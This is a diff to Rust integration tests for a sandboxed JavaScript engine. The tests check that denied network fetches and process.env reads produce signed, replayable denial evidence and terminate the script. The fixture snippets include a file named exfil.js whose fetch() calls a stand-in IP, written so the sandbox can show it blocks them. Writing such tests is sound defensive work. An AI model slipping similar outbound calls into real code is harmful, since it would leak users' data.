@@ -19,11 +19,12 @@ use std::process::Command;
 use std::time::{SystemTime, UNIX_EPOCH};
 
 fn scratch_dir() -> PathBuf {
-    let nonce = SystemTime::now()
+    let stamp_nanos = SystemTime::now()
         .duration_since(UNIX_EPOCH)
         .expect("time")
         .as_nanos();
-    let dir = std::env::temp_dir().join(format!("fe_denial61_{}_{nonce}", std::process::id()));
+    let dir =
+        std::env::temp_dir().join(format!("fe_denial61_{}_{stamp_nanos}", std::process::id()));
     fs::create_dir_all(&dir).expect("scratch dir");
     dir
 }
@@ -33,6 +34,7 @@ fn denied_fetch_writes_a_failure_report_with_signed_denial_evidence() {
     let dir = scratch_dir();
     let input = dir.join("exfil.js");
     let report = dir.join("exfil.report.json");
+    let trust = dir.join("exfil.trust.json");
     fs::write(
         &input,
         "console.log('before'); fetch('http://198.51.100.7/ping'); console.log('after');\n",
@@ -45,6 +47,8 @@ fn denied_fetch_writes_a_failure_report_with_signed_denial_evidence() {
             input.to_str().expect("utf8"),
             "--extension-id",
             "denial61",
+            "--emit-evidence-trust",
+            trust.to_str().expect("utf8"),
             "--out",
             report.to_str().expect("utf8"),
         ])
@@ -65,14 +69,12 @@ fn denied_fetch_writes_a_failure_report_with_signed_denial_evidence() {
     let stdout: serde_json::Value =
         serde_json::from_slice(&output.stdout).expect("stdout carries the same report");
     assert_eq!(written, stdout);
+    assert_eq!(written["outcome"], "capability_denied");
     assert_eq!(written["classification"], "capability_denied");
     assert_eq!(written["exit_code"], 2);
 
-    let chain = &written["uncommitted_evidence_chain"];
-    assert_eq!(chain["commit_state"], "uncommitted");
-    let entries = chain["artifact"]["entries"]
-        .as_array()
-        .expect("evidence entries");
+    let artifact = &written["committed_evidence_chain"];
+    let entries = artifact["entries"].as_array().expect("evidence entries");
     let denial = entries
         .iter()
         .find(|entry| entry["metadata"]["outcome"] == "capability_denied")
@@ -85,16 +87,47 @@ fn denied_fetch_writes_a_failure_report_with_signed_denial_evidence() {
         "the denied capability must be the network request, got {denied}"
     );
     assert_eq!(denial["metadata"]["extension_id"], "denial61");
+    assert_eq!(denial["chosen_action"]["action_name"], "terminate");
     assert!(
         denial["signed_envelope"]["signature"].is_object(),
         "the denial entry is signed"
     );
     assert!(
-        chain["artifact"]["receipt"]["head_chain_hash"]
+        artifact["receipt"]["head_chain_hash"]
             .as_str()
             .is_some_and(|hash| !hash.is_empty()),
         "the denial is chained under a receipt"
     );
+
+    let digest = written["evidence_trust_snapshot_digest"]
+        .as_str()
+        .expect("trust digest emitted");
+    let replay_output = Command::new(env!("CARGO_BIN_EXE_frankenctl"))
+        .args([
+            "replay",
+            "run",
+            "--trace",
+            report.to_str().expect("utf8"),
+            "--mode",
+            "strict",
+            "--trust-snapshot",
+            trust.to_str().expect("utf8"),
+            "--expected-trust-digest",
+            digest,
+        ])
+        .output()
+        .expect("strict replay should execute");
+    assert!(
+        replay_output.status.success(),
+        "strict replay of capability-denied run must succeed: {}",
+        String::from_utf8_lossy(&replay_output.stderr)
+    );
+    let replay_json: serde_json::Value =
+        serde_json::from_slice(&replay_output.stdout).expect("replay json");
+    assert_eq!(replay_json["complete"], true);
+    assert_eq!(replay_json["decisions_match"], true);
+    assert_eq!(replay_json["evidence_authenticated"], true);
+    assert_eq!(replay_json["divergence_count"], 0);
 }
 
 fn run(dir: &std::path::Path, name: &str, source: &str) -> (std::process::Output, PathBuf) {
@@ -141,6 +174,7 @@ fn lowering_time_rejection_writes_a_rejection_report() {
         written["schema_version"],
         "franken-engine.frankenctl.lowering-rejection.v1"
     );
+    assert_eq!(written["outcome"], "rejected_at_lowering");
     assert_eq!(written["classification"], "rejected_at_lowering");
     assert_eq!(written["exit_code"], 2);
     let rejection = &written["rejection"];
@@ -148,6 +182,18 @@ fn lowering_time_rejection_writes_a_rejection_report() {
     assert_eq!(rejection["accessor"], "process.env");
     assert_eq!(rejection["required_effect"], "env.read");
     assert_eq!(rejection["span"]["start_line"], 1);
+    let entries = written["evidence_chain_artifact"]["entries"]
+        .as_array()
+        .expect("signed lowering rejection entries");
+    assert_eq!(entries.len(), 1);
+    assert_eq!(entries[0]["metadata"]["outcome"], "rejected_at_lowering");
+    assert_eq!(entries[0]["chosen_action"]["action_name"], "terminate");
+    assert!(entries[0]["signed_envelope"]["signature"].is_object());
+    assert!(
+        written["evidence_chain_head"]
+            .as_str()
+            .is_some_and(|head| !head.is_empty())
+    );
 
     // A lowering failure that is not a security refusal keeps its old shape:
     // no rejection report.
@@ -158,4 +204,54 @@ fn lowering_time_rejection_writes_a_rejection_report() {
         "a syntax error is not a rejection: {}",
         String::from_utf8_lossy(&output.stderr)
     );
+}
+
+#[test]
+fn capability_denial_terminates_unrecoverably_even_inside_try_catch() {
+    let dir = scratch_dir();
+    let (output, report) = run(
+        &dir,
+        "try_catch_fetch",
+        "try { fetch('http://198.51.100.7/ping'); console.log('escaped'); } catch (e) { console.log('caught'); }\n",
+    );
+    assert_eq!(
+        output.status.code(),
+        Some(2),
+        "capability denial is a non-catchable membrane termination"
+    );
+    let written: serde_json::Value =
+        serde_json::from_str(&fs::read_to_string(&report).expect("failure report written"))
+            .expect("report json");
+    assert_eq!(written["outcome"], "capability_denied");
+}
+
+#[test]
+fn capability_denial_evidence_smoke_script_passes_end_to_end() {
+    let dir = scratch_dir();
+    let repo_root = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
+        .parent()
+        .and_then(|p| p.parent())
+        .expect("workspace root")
+        .to_path_buf();
+    let script = repo_root.join("scripts/e2e/capability_denial_evidence_smoke.sh");
+    let output = Command::new("bash")
+        .arg(&script)
+        .current_dir(&repo_root)
+        .env("FRANKENCTL_BIN", env!("CARGO_BIN_EXE_frankenctl"))
+        .env(
+            "CAPABILITY_DENIAL_ARTIFACT_ROOT",
+            dir.join("artifacts").to_str().expect("utf8"),
+        )
+        .output()
+        .expect("smoke script executes");
+    assert!(
+        output.status.success(),
+        "capability_denial_evidence_smoke.sh failed:\nstdout:\n{}\nstderr:\n{}",
+        String::from_utf8_lossy(&output.stdout),
+        String::from_utf8_lossy(&output.stderr),
+    );
+    let summary: serde_json::Value =
+        serde_json::from_slice(&output.stdout).expect("smoke summary json");
+    assert_eq!(summary["pass"], true);
+    assert_eq!(summary["case_count"], 3);
 }
